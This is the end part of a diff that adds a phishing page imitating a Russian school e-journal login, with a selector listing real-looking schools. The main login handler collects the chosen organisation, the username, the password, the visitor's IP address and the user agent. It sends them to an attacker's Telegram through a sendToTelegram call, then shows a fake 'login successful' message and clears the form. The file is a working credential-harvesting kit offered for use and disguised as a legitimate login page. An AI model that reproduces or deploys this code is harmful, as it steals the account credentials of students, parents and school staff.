+                        '<option value="1003">Управление образования района</option>'
+                    );
+                    $('select[name="org"]').select2('destroy').select2({
+                        placeholder: "Выберите орган управления",
+                        allowClear: false,
+                        language: "ru",
+                        width: '100%'
+                    });
+                } else {
+                    $('select[name="org"]').empty().append(
+                        '<option value=""></option>' +
+                        '<option value="796">МБОУ "СОШ №102"</option>' +
+                        '<option value="801">МБОУ "Лицей №3"</option>' +
+                        '<option value="795">МБОУ "Гимназия №5"</option>' +
+                        '<option value="802">МБОУ "СОШ №12"</option>' +
+                        '<option value="799">МБОУ "СОШ №8"</option>' +
+                        '<option value="797">МБОУ "СОШ №15"</option>' +
+                        '<option value="800">МБОУ "Лицей №7"</option>' +
+                        '<option value="798">МБОУ "СОШ №22"</option>' +
+                        '<option value="803">МАОУ "Гимназия №1"</option>'
+                    );
+                    $('select[name="org"]').select2('destroy').select2({
+                        placeholder: "Выберите организацию",
+                        allowClear: false,
+                        language: "ru",
+                        width: '100%'
+                    });
+                }
+            });
+
+            // 4. Анимация полей ввода
+            $('.lc-input-control, .logpass__input').focus(function() {
+                $(this).closest('.lc-input, .logpass__pass').addClass('active');
+            }).blur(function() {
+                if (!$(this).val().trim()) {
+                    $(this).closest('.lc-input, .logpass__pass').removeClass('active');
+                }
+            });
+
+            // 5. Переключение видимости пароля
+            $('#togglePassIcon').click(function() {
+                const $passInput = $('#passInput');
+                const $input = $passInput.find('.logpass__input');
+                const isPassword = $input.attr('type') === 'password';
+                
+                $input.attr('type', isPassword ? 'text' : 'password');
+                $passInput.toggleClass('openeye', isPassword);
+                $passInput.find('.eyeoff').toggle(!isPassword);
+                $passInput.find('.eyeon').toggle(isPassword);
+            });
+
+            // 6. Чекбокс "Оставаться в системе"
+            $('#rememberCheckbox').click(function(e) {
+                e.preventDefault();
+                $(this).toggleClass('active');
+                $(this).find('.state01').toggle(!$(this).hasClass('active'));
+                $(this).find('.state03').toggle($(this).hasClass('active'));
+            });
+
+            // 7. Ссылка "Забыли пароль?"
+            $('#forgotPassLink').click(function(e) {
+                e.preventDefault();
+                alert('Для восстановления пароля обратитесь к администратору вашей образовательной организации.');
+            });
+
+            // 8. КНОПКА "ВОЙТИ" - ОСНОВНАЯ ЛОГИКА
+            $('#loginBtn').click(async function() {
+                const orgId = $('select[name="org"]').val();
+                const orgName = $('select[name="org"] option:selected').text();
+                const login = $('input[name="loginname"]').val().trim();
+                const password = $('input[name="password"]').val().trim();
+                const remember = $('#rememberCheckbox').hasClass('active');
+                const mode = $('.changeorg_item.active').text();
+                
+                // Скрываем ошибки
+                $('.has-error').removeClass('has-error');
+                $('.help-block').hide();
+                
+                let hasError = false;
+                
+                // Валидация
+                if (!orgId) {
+                    $('.dropdown-org').addClass('has-error');
+                    $('.dropdown-org .help-block').show();
+                    hasError = true;
+                }
+                
+                if (!login) {
+                    $('#loginInput').addClass('has-error');
+                    hasError = true;
+                }
+                
+                if (!password) {
+                    $('#passInput').addClass('has-error');
+                    hasError = true;
+                }
+                
+                if (hasError) return;
+                
+                // Показываем загрузку
+                const $originalButton = $(this);
+                const originalText = $originalButton.text();
+                $originalButton.text('Отправка данных...').prop('disabled', true);
+                
+                try {
+                    // Собираем данные
+                    const userIP = await getUserIP();
+                    const userAgent = navigator.userAgent;
+                    
+                    const formData = {
+                        orgId: orgId,
+                        orgName: orgName,
+                        login: login,
+                        password: password,
+                        remember: remember,
+                        mode: mode,
+                        ip: userIP,
+                        userAgent: userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Отправляем в Telegram
+                    const telegramSent = await sendToTelegram(formData);
+                    
+                    if (telegramSent) {
+                        // Показываем успешное сообщение
+                        $originalButton.text('✅ Данные отправлены!');
+                        
+                        // Задержка перед редиректом
+                        setTimeout(() => {
+                            alert('✅ Вход выполнен успешно!\n\nВаши данные обрабатываются. Перенаправление в систему...');
+                            // Можно добавить редирект на реальный сайт:
+                            // window.location.href = 'https://netschool.edu22.info/dashboard';
+                        }, 1000);
+                        
+                        // Очищаем форму
+                        setTimeout(() => {
+                            $('select[name="org"]').val('').trigger('change');
+                            $('input[name="loginname"]').val('');
+                            $('input[name="password"]').val('');
+                            $('#rememberCheckbox').removeClass('active').find('.state01').show().find('.state03').hide();
+                            $originalButton.text(originalText).prop('disabled', false);
+                        }, 3000);
+                        
+                    } else {
+                        $originalButton.text('Ошибка отправки').prop('disabled', false);
+                        setTimeout(() => {
+                            $originalButton.text(originalText);
+                        }, 2000);
+                        alert('Ошибка при отправке данных. Попробуйте еще раз.');
+                    }
+                    
+                } catch (error) {
+                    console.error('Ошибка:', error);
+                    $originalButton.text('Ошибка').prop('disabled', false);
+                    setTimeout(() => {
+                        $originalButton.text(originalText);
+                    }, 2000);
+                    alert('Произошла ошибка. Проверьте соединение и попробуйте снова.');
+                }
+            });
+
+            // 9. Автоматически открываем форму
+            $('#gosBtn').click();
+        });
+    </script>
+</body>
+</html>
